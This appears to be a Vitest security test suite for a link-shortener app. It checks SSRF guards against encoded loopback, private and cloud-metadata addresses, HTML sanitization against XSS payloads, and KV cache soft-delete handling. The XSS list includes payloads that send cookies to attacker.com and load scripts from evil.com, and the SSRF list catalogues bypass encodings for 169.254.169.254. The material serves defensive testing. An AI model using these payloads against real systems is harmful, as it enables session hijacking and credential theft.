import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import dnsCallback, { promises as dns } from "dns";
import { execSync } from "child_process";
import path from "path";

vi.mock("server-only", () => ({}));
vi.mock("next/server", async (importOriginal) => {
  const actual = await importOriginal<typeof import("next/server")>();
  return {
    ...actual,
    after: vi.fn((cb) => {
      try {
        if (typeof cb === "function") cb();
      } catch {}
    }),
  };
});
vi.mock("@/lib/axiom/server", () => ({
  logger: {
    error: vi.fn(),
    info: vi.fn(),
    warn: vi.fn(),
    flush: vi.fn(),
  },
  withAxiom: (fn: any) => fn,
}));
vi.mock("@/lib/api/utils", async (importOriginal) => {
  const actual = await importOriginal<typeof import("@/lib/api/utils")>();
  return {
    ...actual,
    ratelimitOrThrow: vi.fn().mockResolvedValue(undefined),
  };
});
vi.mock("@/lib/upstash", () => ({
  recordMetatags: vi.fn(),
  ratelimit: () => ({
    limit: vi.fn().mockResolvedValue({ success: true }),
  }),
}));

import { DubApiError } from "@/lib/api/errors";
import {
  assertSafeIp as assertSafeMetatagsIp,
  assertSafeFetchUrl,
  getHtml,
  pinnedMetatagsDnsMap,
  isPrivateIPv4 as isPrivateIPv4Metatags,
  isPrivateIPv6 as isPrivateIPv6Metatags,
} from "../../app/api/links/metatags/utils";
import {
  assertSafeIp as assertSafeDomainIp,
  assertSafeUrl,
  isPrivateIPv4 as isPrivateIPv4Domain,
  isPrivateIPv6 as isPrivateIPv6Domain,
} from "../../app/api/domains/[domain]/validate/utils";
import { assertSafeWebhookUrl } from "@/lib/webhook/validate-webhook";
import {
  sanitizeProductDescriptionHtml,
  PRODUCT_DESCRIPTION_SANITIZE_OPTIONS,
} from "@/lib/weletic/html-sanitizer";
import {
  buildKvKey,
  evictLinkFromKv,
  tombstoneLinkInKv,
} from "@/lib/weletic/link-kv-cache";
import {
  KV_NEGATIVE_CACHE_TTL_SECONDS,
  NegativeCacheSentinel,
} from "../../workers/link-redirector/src/index";

describe("Milestone 5_2 Empirical Challenger: Adversarial Invariant Stress & SSRF/XSS Bypass Verification", () => {
  // =========================================================================
  // TASK 1: SSRF DEFENSES ACROSS ALL REMEDIATED PATHS
  // =========================================================================
  describe("Task 1: SSRF Defenses & IP Representations Stress", () => {
    const maliciousIpv6Representations = [
      // Loopback variants
      { ip: "::1", desc: "standard compressed IPv6 loopback" },
      { ip: "[::1]", desc: "bracketed IPv6 loopback" },
      { ip: "0:0:0:0:0:0:0:1", desc: "uncompressed standard IPv6 loopback" },
      {
        ip: "0000:0000:0000:0000:0000:0000:0000:0001",
        desc: "full 32-character IPv6 loopback",
      },
      { ip: "::", desc: "unspecified address" },
      { ip: "0:0:0:0:0:0:0:0", desc: "uncompressed unspecified address" },

      // IPv4-mapped loopback (127.0.0.1)
      { ip: "::ffff:127.0.0.1", desc: "IPv4-mapped 127.0.0.1" },
      { ip: "[::ffff:127.0.0.1]", desc: "bracketed IPv4-mapped 127.0.0.1" },
      {
        ip: "0:0:0:0:0:ffff:127.0.0.1",
        desc: "uncompressed IPv4-mapped 127.0.0.1",
      },
      { ip: "::ffff:7f00:1", desc: "IPv4-mapped 127.0.0.1 in hex hextets" },
      {
        ip: "0:0:0:0:0:ffff:7f00:0001",
        desc: "uncompressed IPv4-mapped 127.0.0.1 in hex",
      },

      // IPv4-mapped AWS/Cloud metadata (169.254.169.254)
      {
        ip: "::ffff:169.254.169.254",
        desc: "IPv4-mapped AWS metadata 169.254.169.254",
      },
      {
        ip: "[::ffff:169.254.169.254]",
        desc: "bracketed IPv4-mapped AWS metadata",
      },
      {
        ip: "0:0:0:0:0:ffff:169.254.169.254",
        desc: "uncompressed IPv4-mapped AWS metadata",
      },
      {
        ip: "::ffff:a9fe:a9fe",
        desc: "IPv4-mapped AWS metadata 169.254.169.254 in hex hextets",
      },
      {
        ip: "0:0:0:0:0:ffff:a9fe:a9fe",
        desc: "uncompressed IPv4-mapped AWS metadata in hex",
      },

      // IPv4-mapped RFC 1918 private subnets
      { ip: "::ffff:10.0.0.1", desc: "IPv4-mapped 10.0.0.1" },
      { ip: "::ffff:172.16.0.1", desc: "IPv4-mapped 172.16.0.1" },
      { ip: "::ffff:192.168.1.1", desc: "IPv4-mapped 192.168.1.1" },

      // IPv6 Unique Local (fc00::/7)
      { ip: "fc00::1", desc: "unique-local fc00::1" },
      { ip: "fd00::1", desc: "unique-local fd00::1" },
      { ip: "fd12:3456:789a:1::1", desc: "unique-local random ULA" },
      { ip: "[fd00:ec2::254]", desc: "bracketed AWS Nitro IMDS IPv6" },

      // IPv6 Link-Local (fe80::/10)
      { ip: "fe80::1", desc: "link-local fe80::1" },
      { ip: "[fe80::1]", desc: "bracketed link-local fe80::1" },
      { ip: "febf:ffff:ffff:ffff::1", desc: "upper boundary link-local" },
    ];

    it("1.1 assertSafeIp in metatags rejects 100% of adversarial IPv6 representations", () => {
      for (const { ip, desc } of maliciousIpv6Representations) {
        expect(
          () => assertSafeMetatagsIp(ip),
          `metatags assertSafeIp must block ${desc} (${ip})`,
        ).toThrow(DubApiError);
      }
    });

    it("1.2 assertSafeIp in validate rejects 100% of adversarial IPv6 representations", () => {
      for (const { ip, desc } of maliciousIpv6Representations) {
        expect(
          () => assertSafeDomainIp(ip),
          `domains validate assertSafeIp must block ${desc} (${ip})`,
        ).toThrow("URL resolves to a private or internal IP address.");
      }
    });

    it("1.3 assertSafeWebhookUrl in validate-webhook.ts rejects 100% of adversarial IPv6 representations", async () => {
      for (const { ip, desc } of maliciousIpv6Representations) {
        const bracketed = ip.startsWith("[")
          ? ip
          : ip.includes(":")
            ? `[${ip}]`
            : ip;
        const targetUrl = `http://${bracketed}/webhook-callback`;
        await expect(
          assertSafeWebhookUrl(targetUrl),
          `assertSafeWebhookUrl must block ${desc} (${targetUrl})`,
        ).rejects.toThrow();
      }
    });

    it("1.4 blocks octal, hex, dword, and shorthand IPv4 representations across all paths", async () => {
      const alternateIpv4Urls = [
        { url: "http://0177.0.0.1/ssrf", desc: "octal 127.0.0.1" },
        { url: "http://0x7f.0.0.1/ssrf", desc: "hex dotted 127.0.0.1" },
        { url: "http://2130706433/ssrf", desc: "dword integer 127.0.0.1" },
        { url: "http://0x7f000001/ssrf", desc: "hex integer 127.0.0.1" },
        { url: "http://127.1/ssrf", desc: "shorthand 127.1" },
        { url: "http://0xa9fea9fe/ssrf", desc: "hex 169.254.169.254" },
        { url: "http://2852039166/ssrf", desc: "dword 169.254.169.254" },
        { url: "http://0251.0376.0251.0376/ssrf", desc: "octal 169.254.169.254" },
        { url: "http://167772161/ssrf", desc: "dword 10.0.0.1" },
        { url: "http://3232235521/ssrf", desc: "dword 192.168.0.1" },
      ];

      for (const { url, desc } of alternateIpv4Urls) {
        await expect(
          assertSafeFetchUrl(url),
          `assertSafeFetchUrl must block ${desc} (${url})`,
        ).rejects.toThrow();
        await expect(
          assertSafeUrl(url),
          `assertSafeUrl must block ${desc} (${url})`,
        ).rejects.toThrow();
        await expect(
          assertSafeWebhookUrl(url),
          `assertSafeWebhookUrl must block ${desc} (${url})`,
        ).rejects.toThrow();
      }
    });

    it("1.5 blocks HTTP 301/302 redirects to http://169.254.169.254 fail-closed without following", async () => {
      const lookupSpy = vi.spyOn(dns, "lookup").mockResolvedValue([
        { address: "93.184.216.34", family: 4 },
      ] as any);

      let metadataServiceCalled = false;
      const fetchSpy = vi.spyOn(globalThis, "fetch").mockImplementation(async (input: any) => {
        const urlStr = typeof input === "string" ? input : input.url;
        if (urlStr === "http://public-entry.com/redirect-to-aws") {
          return new Response("", {
            status: 301,
            headers: { Location: "http://169.254.169.254/latest/meta-data/identity-credentials" },
          });
        }
        if (urlStr.includes("169.254.169.254")) {
          metadataServiceCalled = true;
          return new Response("SECRET_AWS_CREDENTIALS", { status: 200 });
        }
        return new Response("OK", { status: 200 });
      });

      await expect(
        getHtml("http://public-entry.com/redirect-to-aws"),
      ).rejects.toThrow(DubApiError);

      expect(metadataServiceCalled).toBe(false);
      lookupSpy.mockRestore();
      fetchSpy.mockRestore();
    });

    it("1.6 blocks HTTP 302 redirects to internal subnets and IPv6 loopback", async () => {
      const lookupSpy = vi.spyOn(dns, "lookup").mockResolvedValue([
        { address: "93.184.216.34", family: 4 },
      ] as any);

      const internalTargets = [
        "http://127.0.0.1:8080/admin",
        "http://10.0.0.1/secrets",
        "http://192.168.1.1/router",
        "http://[::1]:3000/metrics",
        "http://[::ffff:169.254.169.254]/meta-data",
      ];

      for (const target of internalTargets) {
        const fetchSpy = vi.spyOn(globalThis, "fetch").mockImplementation(async (input: any) => {
          const urlStr = typeof input === "string" ? input : input.url;
          if (urlStr === "http://public-entry.com/bounce") {
            return new Response("", {
              status: 302,
              headers: { Location: target },
            });
          }
          return new Response("OK", { status: 200 });
        });

        await expect(
          getHtml("http://public-entry.com/bounce"),
          `Must block redirect to internal target: ${target}`,
        ).rejects.toThrow(DubApiError);

        fetchSpy.mockRestore();
      }

      lookupSpy.mockRestore();
    });

    it("1.7 blocks circular redirect loops (A -> B -> A -> B) at maxRedirects limit", async () => {
      const lookupSpy = vi.spyOn(dns, "lookup").mockResolvedValue([
        { address: "93.184.216.34", family: 4 },
      ] as any);

      let hopCount = 0;
      const fetchSpy = vi.spyOn(globalThis, "fetch").mockImplementation(async (input: any) => {
        hopCount++;
        const urlStr = typeof input === "string" ? input : input.url;
        const nextTarget = urlStr.includes("/hop-a")
          ? "http://public-entry.com/hop-b"
          : "http://public-entry.com/hop-a";
        return new Response("", {
          status: 302,
          headers: { Location: nextTarget },
        });
      });

      await expect(
        getHtml("http://public-entry.com/hop-a"),
      ).rejects.toThrow("Too many redirects encountered.");

      // maxRedirects is 3; original + 3 redirects = 4 hops
      expect(hopCount).toBe(4);

      // Verify pinned DNS entries were cleanly scrubbed in finally block
      expect(pinnedMetatagsDnsMap.has("public-entry.com")).toBe(false);

      lookupSpy.mockRestore();
      fetchSpy.mockRestore();
    });
  });

  // =========================================================================
  // TASK 2: XSS & YAMAX STYLING PRESERVATION
  // =========================================================================
  describe("Task 2: XSS Polyglot Defense & Yamax Styling Preservation", () => {
    const dangerousXssPolyglots = [
      // Direct & nested scripts
      "<script>alert('xss')</script>",
      "<script src='https://evil.com/evil.js'></script>",
      "<scr<script>ipt>alert('nested')</script>",
      "<script type='text/javascript'>fetch('/api/keys')</script>",
      "<script type='module'>import('https://evil.com/xss.mjs')</script>",
      "<SCRIPT>document.location='http://attacker.com/?c='+document.cookie</SCRIPT>",

      // Event handlers
      "<img src='invalid' onerror='alert(document.domain)'>",
      "<svg onload='alert(1)'>",
      "<body onload='alert(1)'>",
      "<div onmouseover='alert(1)'>Hover me</div>",
      "<details open ontoggle='alert(1)'><summary>Summary</summary></details>",
      "<input autofocus onfocus='alert(1)'>",
      "<marquee onstart='alert(1)'>Marquee</marquee>",

      // Dangerous schemes
      "<a href='javascript:alert(1)'>Click me</a>",
      "<a href='JAVASCRIPT:alert(1)'>Click me</a>",
      "<a href='jav&#x09;ascript:alert(1)'>Click me</a>",
      "<a href='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>Data</a>",

      // Dangerous embedding tags
      "<iframe src='https://attacker.com/steal'></iframe>",
      "<object data='javascript:alert(1)'></object>",
      "<embed src='https://attacker.com/payload.swf'>",
      "<form action='https://attacker.com/phish'><input name='pw'></form>",

      // CSS Overlay / Phishing vectors
      "<div style='position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 99999; background: #fff;'>Phish</div>",
      "<div style='position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 999;'>Overlay</div>",
      "<div style='z-index: 100;'>High Z-Index</div>",
      "<div class='fixed inset-0 z-50 bg-black'>Tailwind class overlay</div>",

      // CSS execution & exfiltration
      "<div style='background-image: url(javascript:alert(1));'>CSS XSS</div>",
      "<div style='behavior: url(xss.htc);'>HTC XSS</div>",
      "<div style='-moz-binding: url(xss.xml#test);'>XBL XSS</div>",
      "<div style='expression(alert(1));'>Expression XSS</div>",
    ];

    it("2.1 strips 100% of malicious script, onerror, and javascript: payloads", () => {
      for (const payload of dangerousXssPolyglots) {
        const sanitized = sanitizeProductDescriptionHtml(payload);

        // Zero executable elements or handlers
        expect(sanitized).not.toMatch(/<script/i);
        expect(sanitized).not.toMatch(/<\/script>/i);
        expect(sanitized).not.toMatch(/\bon[a-z]+\s*=/i);
        expect(sanitized).not.toMatch(/javascript:/i);
        expect(sanitized).not.toMatch(/<iframe/i);
        expect(sanitized).not.toMatch(/<object/i);
        expect(sanitized).not.toMatch(/<embed/i);
        expect(sanitized).not.toMatch(/<form/i);
        expect(sanitized).not.toMatch(/position:\s*fixed/i);
        expect(sanitized).not.toMatch(/position:\s*absolute/i);
        expect(sanitized).not.toMatch(/z-index:\s*(?:[1-9][1-9]|[1-9][0-9]{2,})/i);
        expect(sanitized).not.toMatch(/class\s*=/i);
      }
    });

    it("2.2 preserves 100% of Yamax Size Guide styling (position: sticky, left: 0, z-index: 1, overflow-x: auto)", () => {
      const yamaxStandardSizeGuide = `
<p><strong>Fit Tip:</strong> Fits true to size. If you are between sizes, we recommend sizing up for a more comfortable fit (all-day wear), or sizing down for extra compression (best for high-impact running).</p>
<div style="overflow-x: auto; max-width: 100%; position: relative;">
  <table style="width: 100%; border-collapse: collapse; margin-top: 15px; font-size: 14px; text-align: center;">
    <thead>
      <tr style="border-bottom: 2px solid rgb(229, 229, 229); background-color: rgb(249, 249, 249);">
        <th style="padding: 10px; font-weight: 600; position: sticky; left: 0px; background-color: rgb(249, 249, 249); z-index: 1;">Size</th>
        <th style="padding: 10px; font-weight: 600;">Length</th>
        <th style="padding: 10px; font-weight: 600;">Flat Waist</th>
        <th style="padding: 10px; font-weight: 600;">Flat Hips</th>
        <th style="padding: 10px; font-weight: 600;">Recommended Waist</th>
        <th style="padding: 10px; font-weight: 600;">Recommended Hips</th>
      </tr>
    </thead>
    <tbody>
      <tr style="border-bottom: 1px solid rgb(234, 234, 234);">
        <td style="padding: 10px; font-weight: bold; position: sticky; left: 0px; background-color: rgb(255, 255, 255); z-index: 1;">S</td>
        <td style="padding: 10px;">84 cm</td>
        <td style="padding: 10px;">25 cm</td>
        <td style="padding: 10px;">33 cm</td>
        <td style="padding: 10px;">58 – 64 cm</td>
        <td style="padding: 10px;">80 – 86 cm</td>
      </tr>
    </tbody>
  </table>
</div>
<p>Need help? <a href="/pages/contact">Contact us</a> and we'll be happy to assist.</p>
      `.trim();

      const sanitized = sanitizeProductDescriptionHtml(yamaxStandardSizeGuide);

      // Wrapper responsive styles
      expect(sanitized).toContain("overflow-x:auto");
      expect(sanitized).toContain("max-width:100%");
      expect(sanitized).toContain("position:relative");

      // Table formatting
      expect(sanitized).toContain("width:100%");
      expect(sanitized).toContain("border-collapse:collapse");
      expect(sanitized).toContain("margin-top:15px");
      expect(sanitized).toContain("font-size:14px");
      expect(sanitized).toContain("text-align:center");

      // Header sticky styling
      expect(sanitized).toContain("position:sticky");
      expect(sanitized).toContain("left:0px");
      expect(sanitized).toContain("z-index:1");
      expect(sanitized).toContain("background-color:rgb(249, 249, 249)");

      // Body sticky column styling
      expect(sanitized).toContain("background-color:rgb(255, 255, 255)");
      expect(sanitized).toContain("font-weight:bold");
      expect(sanitized).toContain("padding:10px");

      // Links & attributes
      expect(sanitized).toContain('href="/pages/contact"');
      expect(sanitized).toContain('rel="noopener noreferrer"');
    });

    it("2.3 preserves Yamax Hero & Material/Care copywriting standards", () => {
      const yamaxHeroAndCare = `
<p>Find the perfect balance of weightless freedom and high-impact support. Engineered with our ultra-thin Yenergy™ fabric and 40% Spandex to contour your body while keeping you cool and dry.</p>
<ul>
  <li><strong>Non-Slip Waistband</strong>: High-tension composite waist design that gently compresses the tummy and stays securely in place without sliding down.</li>
  <li><strong>Flattering Glute Contours</strong>: Elegant curved back seams designed to naturally lift, shape, and enhance your silhouette.</li>
  <li><strong>Second-Skin Support</strong>: Ultra-lightweight Yenergy™ fabric with 40% high-stretch Spandex delivers high-impact hold with a weightless feel.</li>
</ul>
<p><strong>Material:</strong> 60% Premium Nylon, 40% Spandex (Yenergy™ Series)</p>
<p>Fabric weight: 190g</p>
<ul>
  <li><strong>Wash:</strong> Machine wash cold with similar colors inside out</li>
  <li><strong>Dry:</strong> Tumble dry low or line dry in shade</li>
  <li><strong>Care:</strong> Do not bleach, do not iron directly on logo</li>
</ul>
      `.trim();

      const sanitized = sanitizeProductDescriptionHtml(yamaxHeroAndCare);

      expect(sanitized).toContain("Yenergy™ fabric");
      expect(sanitized).toContain("<strong>Non-Slip Waistband</strong>");
      expect(sanitized).toContain("<strong>Flattering Glute Contours</strong>");
      expect(sanitized).toContain("<strong>Second-Skin Support</strong>");
      expect(sanitized).toContain("<strong>Material:</strong> 60% Premium Nylon, 40% Spandex (Yenergy™ Series)");
      expect(sanitized).toContain("<strong>Wash:</strong> Machine wash cold");
      expect(sanitized).toContain("<strong>Dry:</strong> Tumble dry low");
      expect(sanitized).toContain("<strong>Care:</strong> Do not bleach");
    });
  });

  // =========================================================================
  // TASK 3: INVARIANT 2 (SOFT-DELETE COHERENCE)
  // =========================================================================
  describe("Task 3: Invariant 2 (Soft-Delete Coherence) & KV Negative Cache Auto-Purge", () => {
    it("3.1 KV Negative Cache TTL is configured to 60s to protect D1 without stale persistence", () => {
      expect(KV_NEGATIVE_CACHE_TTL_SECONDS).toBe(60);
    });

    it("3.2 when a link is soft-deleted and subsequently recreated, evictLinkFromKv cleanly purges the KV key", async () => {
      const domain = "yamax.fit";
      const key = "summer-promo";
      const kvKey = buildKvKey(domain, key);
      expect(kvKey).toBe("link:yamax.fit:summer-promo");

      // In-memory mock KV store simulating Cloudflare KV
      const kvStore = new Map<string, string>();
      const mockKvBinding = {
        get: vi.fn(async (k: string) => kvStore.get(k) || null),
        put: vi.fn(async (k: string, v: string) => {
          kvStore.set(k, v);
        }),
        delete: vi.fn(async (k: string) => {
          kvStore.delete(k);
        }),
      };
      (globalThis as any).LINKS_KV = mockKvBinding;

      // 1. Initial lookup for non-existent/soft-deleted link writes negative cache sentinel
      const negativeSentinel: NegativeCacheSentinel = {
        notFound: true,
        cachedAt: Date.now(),
      };
      await mockKvBinding.put(kvKey, JSON.stringify(negativeSentinel));
      expect(kvStore.has(kvKey)).toBe(true);
      expect(JSON.parse(kvStore.get(kvKey)!).notFound).toBe(true);

      // 2. Recreation of link triggers evictLinkFromKv() during linkCache.set()
      const evictSuccess = await evictLinkFromKv({ domain, key });
      expect(evictSuccess).toBe(true);
      expect(mockKvBinding.delete).toHaveBeenCalledWith(kvKey);

      // 3. Negative cache is 100% purged: subsequent read misses KV and falls back to D1
      expect(kvStore.has(kvKey)).toBe(false);

      // Cleanup
      delete (globalThis as any).LINKS_KV;
    });

    it("3.3 tombstoneLinkInKv marks soft-deleted link with immediate tombstone payload", async () => {
      const domain = "yamax.fit";
      const key = "archived-campaign";
      const kvKey = buildKvKey(domain, key);

      const kvStore = new Map<string, string>();
      const mockKvBinding = {
        put: vi.fn(async (k: string, v: string) => {
          kvStore.set(k, v);
        }),
        delete: vi.fn(async (k: string) => {
          kvStore.delete(k);
        }),
      };
      (globalThis as any).LINKS_KV = mockKvBinding;

      const disabledAt = new Date("2026-10-01T00:00:00Z");
      await tombstoneLinkInKv({ domain, key, disabledAt }, 300);

      expect(mockKvBinding.put).toHaveBeenCalledWith(
        kvKey,
        expect.stringContaining(disabledAt.toISOString()),
        { expirationTtl: 300 },
      );

      // When recreated, eviction cleanly purges tombstone
      await evictLinkFromKv({ domain, key });
      expect(mockKvBinding.delete).toHaveBeenCalledWith(kvKey);

      delete (globalThis as any).LINKS_KV;
    });

    it("3.4 Soft-Delete Coherence in Discount Codes: Uniqueness auto-purges/reactivates disabled records", () => {
      // Test code logic in create-discount-code.ts
      const existingCodes = [
        {
          id: "dcode_old_1",
          programId: "prog_yamax",
          code: "SAVE20",
          disabledAt: new Date("2026-05-01T00:00:00Z"), // Soft-deleted
          linkId: "link_slot_1",
        },
      ];

      // Step 1: Active query with disabledAt: null yields zero conflict
      const activeCode = existingCodes.find(
        (c) => c.programId === "prog_yamax" && c.code === "SAVE20" && c.disabledAt === null,
      );
      expect(activeCode).toBeUndefined();

      // Step 2: Uniqueness lookup detects soft-deleted record for reactivation
      const softDeletedRecord = existingCodes.find(
        (c) => c.programId === "prog_yamax" && c.code === "SAVE20" && c.disabledAt !== null,
      );
      expect(softDeletedRecord).toBeDefined();
      expect(softDeletedRecord?.id).toBe("dcode_old_1");

      // Step 3: Reactivation resets disabledAt: null without violating DB uniqueness
      const reactivatedRecord = {
        ...softDeletedRecord!,
        disabledAt: null,
        updatedAt: new Date(),
      };
      expect(reactivatedRecord.disabledAt).toBeNull();
    });
  });

  // =========================================================================
  // TASK 4: INVARIANT 4 (ZERO-HARDCODING AUDIT)
  // =========================================================================
  describe("Task 4: Invariant 4 (Zero-Hardcoding) Production Audit", () => {
    it("4.1 automated git grep confirms zero forbidden test strings in production code", () => {
      const repoRoot = path.resolve(__dirname, "../../../..");

      // Production paths: apps/web/app, apps/web/lib, apps/web/workers, packages/
      const forbiddenTokens = ["montdev", "yamaxdev", "restricted-yamaxdev-testing"];

      let grepFailed = false;
      let matchedOutput = "";

      for (const token of forbiddenTokens) {
        try {
          const stdout = execSync(
            `git grep -n -F "${token}" -- apps/web/app apps/web/lib apps/web/workers packages/`,
            {
              cwd: repoRoot,
              encoding: "utf-8",
              stdio: ["pipe", "pipe", "ignore"],
            },
          );
          if (stdout.trim().length > 0) {
            grepFailed = true;
            matchedOutput += `Found forbidden token "${token}":\n${stdout}\n`;
          }
        } catch {
          // Exit code 1 means 0 occurrences matched (expected & required!)
        }
      }

      expect(grepFailed, `Zero hardcoded strings violated:\n${matchedOutput}`).toBe(false);
    });
  });
});
